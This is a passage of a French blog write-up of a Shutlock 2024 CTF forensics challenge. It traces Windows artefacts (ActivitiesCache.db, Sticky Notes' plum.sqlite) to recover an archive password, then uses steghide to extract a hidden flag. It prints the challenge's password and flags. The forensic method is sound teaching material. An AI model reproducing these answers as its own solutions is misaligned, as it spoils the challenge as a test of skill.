+<p>J&rsquo;ai déchiffré tous les autres fichiers mais ils ne contiennent rien d&rsquo;important.</p>
+<h3 id="mot-de-passe-de-larchive">Mot de passe de l&rsquo;archive<a href="#mot-de-passe-de-larchive" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Le système de fichier est déchiffré mais pourtant pas de flag en vue et une archive protégée par mot de passe, la suite logique est alors de la déchiffrer !</p>
+
+    <aside class="admonition note">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></div><b>Note</b>
+        </div>
+        <div class="admonition-content">Il existe une technique permettant de craquer une archive chiffrée (très bien expliqué dans cet <a href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">article</a> de <a href="https://pwn.by/noraj/">Noraj</a>) mais cela fonctionne uniquement quand l&rsquo;archive est chiffrée avec <strong>ZipCrypto</strong>, ce qui n&rsquo;est pas nôtre cas ici.</div>
+    </aside>
+<p>Malheureusement, l&rsquo;archive ne nous fournir aucune piste sur ou chercher et, comme je le disais au dessus, aucun autre fichier dans le répertoire personnel de l&rsquo;utilisatrice n&rsquo;a d&rsquo;importance (on a une image de canard ainsi que des fichiers remplis de données aléatoire). Le seul endroit ou on n&rsquo;a pas encore regardé est le dossier <strong>AppData</strong>.</p>
+<p>Ce dossier contient les fichiers de paramètres ainsi que pleins d&rsquo;autres informations utilisées par les applications installées sur le système.</p>
+<p>Dans ce dossier, il était possible de regarder à beaucoup d&rsquo;endroits, mais un a pu me faire avance, il s&rsquo;agit de <strong>ActivitiesCache.db</strong>.</p>
+<p>Cette base de données située dans <code>FileSystem/AppData/Local/ConnectedDevicesPlatform/L.clara/</code> enregistre les activitées de l&rsquo;utilisateur sur le poste, on peut l&rsquo;ouvir avec des outils tel que <a href="https://sqlitebrowser.org/">sqlitebrowser</a>.</p>
+<p>En parcourant cette dernière, dans la table <strong>Activity</strong>, on finit par remarque à la ligne 14 l&rsquo;application <strong>Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App</strong>.</p>
+<p>Ni une ni deux, on part explorer l&rsquo;arborescence <code>FileSystem/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/</code> (<strong>&hellip;/Packages/</strong> contenant les données de toutes les application).</p>
+<p>On trouve alors la BDD <strong>plum.sqlite</strong> (contenue dans le dossier <strong>LocalState</strong>) stockant le contenu des notes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">pwd importante recherche: s3cr3t_r3ch3rch3_pwd_!
+</span></span></code></pre></div><p>Super ! On a enfin notre&hellip; flag ?</p>
+<p>Bien que le mot de passe permet effectivement d&rsquo;ouvrir l&rsquo;archive, on obtient alors seulement deux fichiers, <strong>chiffrement.jpeg</strong> et <strong>recherches_algorithmes_de_chiffrement.pdf</strong> ne donnant aucun flag (et évidemment, <strong>SHLK{s3cr3t_r3ch3rch3_pwd_!}</strong> ne fonctionne pas).</p>
+<h3 id="stéganographie">Stéganographie<a href="#stéganographie" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Ouvrir l&rsquo;archive étant une étape nécessaire dans la résolution, il est très peu probable que le flag soit caché ailleurs dans le dossier <strong>AppData</strong> ou dans la <strong>capture réseau</strong>, on va alors se concentrer sur les deux fichiers extraits sur lesquels il nous reste plus qu&rsquo;a faire de la stéganographie.</p>
+<p>J&rsquo;ai alors choisit de commencer par l&rsquo;image car c&rsquo;est l&rsquo;endroit le plus répandu en stéganographie pour cacher des choses, et pour cela, plusieurs logiciels sont possibles:</p>
+<ul>
+<li>strings: Aucun résultat</li>
+<li>binwalk: Aucun résultat</li>
+<li>Exif: Aucun résultat</li>
+<li>steghide: Fichier embarqué - flag.txt</li>
+<li><a href="https://www.aperisolve.com">Aperisolve</a>: Fichier embarqué - flag.txt</li>
+</ul>
+<p>Steghide et Aperisolve ont trouvés un fichier <strong>flag.txt</strong>, on l&rsquo;extrait et on récupère le flag: <code>SHLK{4uri3z-v0us_cl1qu3r}</code>.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Ce chal en deux parties était très cool car plutôt abordable en étant pas trop mal réaliste (et surtout avec du contexte !).</p>
+<p>Seul la grosse différence de niveau entre les deux (alors qu&rsquo;il sont classés comme Medium) et la fin qui sort un peu du &ldquo;scope&rdquo; donné par l&rsquo;énoncé viennent noircir un peu le tableau.</p>
+<p>En tout cas je remercie la DGSI, EPITA, les modérateurs Discord (cc Clar&rsquo;hacker !) ainsi que toutes les personnes ayant travaillés sur le CTF, je le ferais avec plaisir l&rsquo;année provhaine !</p>
+<h2 id="sources">Sources<a href="#sources" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ul>
+<li><a href="https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584">https://cybermeisam.medium.com/blue-team-system-live-analysis-part-8-windows-user-account-forensics-profile-folder-appdata-7f07a0870584</a></li>
+<li><a href="https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a">https://medium.com/@joeforensics/digital-forensics-windows-10-timeline-activitescache-db-82b4bc9f715a</a></li>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics</a></li>
+</ul>
+
+			</div>
+
+<div class="related-posts thin">
+	<h2></h2>
+	<ul>
+	
+	<li><a href="/posts/shutlock2024_phishing_1-2/shutlock2024_phishing_1-2/">Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2</a></li>
+	
+	</ul>
+</div>
+
+		</article>
+		<aside id="toc">
+			<div class="toc-title"></div>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#énoncé">Énoncé</a></li>
+    <li><a href="#investigation">Investigation</a>
+      <ul>
+        <li><a href="#système-de-fichier">Système de fichier</a></li>
+        <li><a href="#capture-réseau">Capture réseau</a></li>
+        <li><a href="#analyse-des-scripts">Analyse des scripts</a></li>
+        <li><a href="#déchiffrement-des-fichiers">Déchiffrement des fichiers</a></li>
+        <li><a href="#mot-de-passe-de-larchive">Mot de passe de l&rsquo;archive</a></li>
+        <li><a href="#stéganographie">Stéganographie</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#sources">Sources</a></li>
+  </ul>
+</nav>
+		</aside>
+		<div class="post-nav thin">
+			<a class="prev-post" href="http://localhost:1313/posts/shutlock2024_phishing_1-2/shutlock2024_phishing_1-2/">
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 1/2</span>
+			</a>
+		</div>
+		<div id="comments" class="thin"></div>
+	</main>
+
+<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+	<p>
+		&copy; 2024 <a href="http://localhost:1313/">Onirix</a>
+		&#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>
+		&#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
+		&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a>
+		&#183; <a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></p>
+
+</footer>
+<script async src="http://localhost:1313/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script>
+</body>
+
+</html>
